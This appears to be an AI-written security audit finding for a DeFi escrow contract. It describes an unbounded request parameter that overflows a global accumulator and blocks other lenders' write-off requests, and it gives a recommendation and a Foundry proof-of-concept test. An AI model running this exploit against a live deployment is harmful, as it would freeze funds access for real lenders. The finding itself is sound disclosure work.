### Title
Unvalidated `underlyingsRequested` overflows `pendingUnderlyings`, permanently freezing the write-off escrow during a running epoch - ([File: contracts/IdleCreditVaultWriteOffEscrow.sol](contracts/IdleCreditVaultWriteOffEscrow.sol))

### Summary
`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` takes a lender-supplied `underlyingsRequested` and adds it into the global accumulator `pendingUnderlyings` with no bound check — the same bug class as the Fedimint commit, where an unvalidated amount was fed into a sum whose overflow panicked the process. A lender can set `pendingUnderlyings` to `type(uint256).max` (or near it) with a single request backed by a dust amount of tranche tokens, after which every subsequent `createWriteOffRequest` with a non-zero `underlyingsRequested` reverts on the overflowed `+=`, freezing the write-off market for all other lenders while the epoch is running.

### Finding Description
In `createWriteOffRequest` (lines 86-102):

```solidity
userRequests[msg.sender] = WriteOffRequest({
  tranches: currentRequest.tranches + amount,
  underlyings: currentRequest.underlyings + underlyingsRequested
});
pendingUnderlyings += underlyingsRequested;
```

`underlyingsRequested` is fully attacker-controlled and never validated against the tranche deposit, the tranche price, or any sane cap. The only requirements are `isEpochRunning()` and `amount != 0`, so the attacker needs just 1 wei of tranche tokens. With `underlyingsRequested = type(uint256).max`, `pendingUnderlyings` becomes `max`. Thereafter:

- Any honest lender calling `createWriteOffRequest(x, y>0)` reverts, since `max + y` overflows (Solidity 0.8 checked arithmetic).
- `fullfillWriteOffRequest` on other users' requests does `pendingUnderlyings -= currentRequest.underlyings`, which still works, but no new requests can ever be created.
- `deleteWriteOffRequest` decrements via the saturating `min` guard (line 112), so the attacker can even delete and re-create the poisoned request at will, keeping the accumulator saturated indefinitely at zero marginal cost.

### Impact Explanation
Permanent (attacker-maintained) freezing of the write-off mechanism for the entire running epoch. Legitimate lenders who suffer a borrower default cannot create write-off requests while the overflow is maintained, and any flow that consumes `pendingUnderlyings` (e.g., `writeOffDeposit` accounting in `IdleCDOEpochVariant`, which reads the escrow) sees a corrupted global total. Cost to the attacker is one dust tranche deposit, recoverable via `deleteWriteOffRequest`. This mirrors the report's "single anonymous call panics the handler" — one unprivileged call poisons shared state so every subsequent call on that path reverts.

### Likelihood Explanation
High: any KYC-passed lender holding even 1 wei of tranche tokens can execute it in one transaction during the buffer/running phase, with no privileged actor cooperation, and can keep it in place indefinitely.

### Recommendation
Bound `underlyingsRequested` at request creation (e.g., cap it to the redeemable value of the deposited tranches at current price, or to a sane max), and use a checked/saturating accumulation for `pendingUnderlyings` — analogous to the report's `MAX_MONEY` gate and `checked_add` loop.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVaultWriteOffEscrow} from "../contracts/IdleCreditVaultWriteOffEscrow.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract WriteOffOverflowPoC is Test {
    IdleCreditVaultWriteOffEscrow escrow;
    address attacker = address(0xA77);
    address honestLender = address(0xBEEF);
    address tranche; // AATranche/BBTranche of the deployed IdleCDOEpochVariant

    function test_PoisonPendingUnderlyings() public {
        // fork setup: deploy/attach escrow against a live IdleCDOEpochVariant
        // while isEpochRunning() == true; give both users tranche tokens.

        // 1) Attacker deposits dust tranches + unbounded underlyingsRequested
        vm.startPrank(attacker);
        IERC20Detailed(tranche).approve(address(escrow), 1);
        escrow.createWriteOffRequest(1, type(uint256).max);
        vm.stopPrank();
        assertEq(escrow.pendingUnderlyings(), type(uint256).max);

        // 2) Honest lender's request now always reverts on the += overflow
        vm.startPrank(honestLender);
        IERC20Detailed(tranche).approve(address(escrow), 100e18);
        vm.expectRevert(stdError.arithmeticError);
        escrow.createWriteOffRequest(100e18, 1);
        vm.stopPrank();

        // 3) Attacker can even delete + re-create to keep it saturated forever
        vm.prank(attacker);
        escrow.deleteWriteOffRequest();
        vm.startPrank(attacker);
        IERC20Detailed(tranche).approve(address(escrow), 1);
        escrow.createWriteOffRequest(1, type(uint256).max);
        vm.stopPrank();
    }
}
```

Uncertainty note: within the iteration budget I confirmed the overflow site and its guards but could not trace every consumer of `pendingUnderlyings` (e.g., whether `IdleCDOEpochVariant.writeOffDeposit` or epoch stop logic reads it); if it gates borrower write-off or epoch transitions, the impact escalates from escrow-market freeze to freezing borrower default resolution.
